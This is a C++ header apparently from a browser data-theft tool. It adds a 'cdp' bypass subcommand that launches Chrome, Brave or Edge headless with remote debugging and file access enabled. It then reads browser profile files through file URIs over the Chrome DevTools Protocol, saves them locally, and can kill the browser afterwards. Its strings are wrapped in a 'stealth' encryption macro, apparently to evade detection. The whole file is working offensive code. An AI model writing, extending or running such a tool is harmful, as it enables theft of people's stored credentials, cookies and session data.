#pragma once

#include <CLI/CLI.hpp>
#include <filesystem>
#include <fstream>
#include <format>
#include <optional>
#include <string>
#include <vector>

#include "app/context.h"
#include "launchers/launcher.hpp"
#include "terminators/terminator.hpp"
#include "browsers/browsers.h"
#include "manager/manager.h"
#include "imports/cdp_minimal/include/cdp/browser.h"
#include "sleep/sleep.hpp"
#include "stealth/encryption.hpp"

// ---------------------------------------------------------------------------
// CDP downloader
// ---------------------------------------------------------------------------
class CdpDownloader final : public Downloader {
public:
    CdpDownloader(Context& cdpCtx, std::string address, int cdpPort)
        : ctx(cdpCtx)
        , ipAddress(std::move(address))
        , port(cdpPort)
        , browser(ipAddress, port)
    {
    }

    const char* name() const override {
        return CRYPT("browser-cdp").c_str();
    }

    bool setup() override {
        ctx.out.verbosePrint(
            CRYPT("attempting to connect to browser @ ") +
            ipAddress + ":" + std::to_string(port)
        );

        if (!browser.connect()) {
            ctx.out.error(
                CRYPT("failed to connect to a browser @ ") +
                ipAddress + ":" + std::to_string(port)
            );
            return false;
        }

        ctx.out.print(CRYPT("successfully connected to the target browser"));
        return true;
    }

    DownloadResult fetch(const DownloadRequest& req) override {
        DownloadResult r;

        if (!browser.isConnected()) {
            r.detail = "not connected";
            return r;
        }

        cdp::Result<std::string> content = browser.readFileViaFileURI(req.input);
        if (!content) {
            r.detail = content.error().message;

            // custom cdp error
            if (r.detail.find(CRYPT("Failed to load")) != std::string::npos) {
                r.detail = CRYPT("failed to download file: '") + req.input + CRYPT("' it does not exist");
            }

            r.ok = false;
            return r;
        }

        const auto& data = content.value();
        std::ofstream out(std::filesystem::path(req.destFile), std::ios::binary);
        out.write(data.data(), static_cast<std::streamsize>(data.size()));
        r.filePath = req.destFile;
        r.ok = out.good();
        r.bytes = data.size();
        return r;
    }

private:
    Context& ctx;
    std::string ipAddress;
    int port;
    cdp::Browser browser;
};

// ---------------------------------------------------------------------------
// Single bypass method
// ---------------------------------------------------------------------------
class BypassMethod {
public:
    void setup(CLI::App& cli, Context& ctx);
    void run(Context& ctx);

private:
    int port = 0;
    std::string ipAddress = "127.0.0.1";
    std::string launch;
    bool kill = false;
};

inline void BypassMethod::setup(CLI::App& cli, Context& ctx)
{
    auto* sub = cli.add_subcommand(
        CRYPT("cdp"),
        CRYPT("Downloads the files through the Chrome DevTools Protocol")
    );

    sub->add_option(
        CRYPT("-p,--port"),
        port,
        CRYPT("remote debugging port to connect to")
    )
        ->check(CLI::Range(0, 65535))
        ->default_val(9222);

    sub->add_option(
        CRYPT("-i,--ip-address"),
        ipAddress,
        CRYPT("IP address of the browser with remote debugging enabled")
    )
        ->default_val(CRYPT("127.0.0.1"));

    sub->add_option(
        CRYPT("-L,--launch"),
        launch,
        CRYPT("Launch a browser configured for the CDP bypass. "
            "Usage: -L <browser>, e.g. -L chrome, -L brave, or -L edge.")
    )
        ->default_val("");

    sub->add_flag(
        CRYPT("-k,--kill"),
        kill,
        CRYPT("Kill the launched browser after all profile files are downloaded.")
    );

    sub->callback([this, &ctx]() {
        run(ctx);
        });
}

inline void BypassMethod::run(Context& ctx)
{
    LaunchResult launchResult{};

    if (!launch.empty()) {
        std::optional<Browser> browser = browserFromName(launch);
        if (!browser) {
            ctx.out.error(CRYPT("unknown browser name '") + launch + "'");
            return;
        }

        auto path = resolveBrowser(*browser);
        if (!path) {
            ctx.out.error(
                CRYPT("browser '") + launch +
                CRYPT("' is not installed, or its executable could not be found")
            );
            return;
        }

        std::vector<std::string> args = {
            CRYPT("--remote-debugging-port=") + std::to_string(port),
            CRYPT("--headless"),
            CRYPT("--allow-file-access-from-files"),
        };

        Launcher launcher(std::filesystem::path(*path).string(), args);

        ctx.out.verbosePrint(
            CRYPT("launching browser: ") + launcher.commandLine()
        );

        launchResult = launcher.launch();
        if (!launchResult) {
            ctx.out.error(
                CRYPT("failed to launch browser '") + launch + "': " +
                launchResult.detail + " (error " +
                std::to_string(launchResult.errorCode) + ")"
            );
            return;
        }

        ctx.out.print(
            CRYPT("Launched browser (PID: ") + std::to_string(launchResult.pid) +
            CRYPT(", TID: ") + std::to_string(launchResult.tid) +
            CRYPT("), sleeping for 3 seconds"));

        sleepMs(3000);
    }

    Manager mgr(ctx);
    CdpDownloader cdpDl(ctx, ipAddress, port);
    mgr.downloadProfile(cdpDl);

    if (kill && launchResult) {
        ctx.out.verbosePrint(
            CRYPT("attempting to kill browser with PID: ") +
            std::to_string(launchResult.pid)
        );

        Terminator terminator(launchResult.pid);
        TerminationResult termResult = terminator.kill();

        if (!termResult) {
            ctx.out.error(
                CRYPT("failed to terminate browser process (error: ") +
                termResult.detail + ")"
            );
        }
        else {
            ctx.out.print(CRYPT("successfully killed the browser process"));
        }
    }
}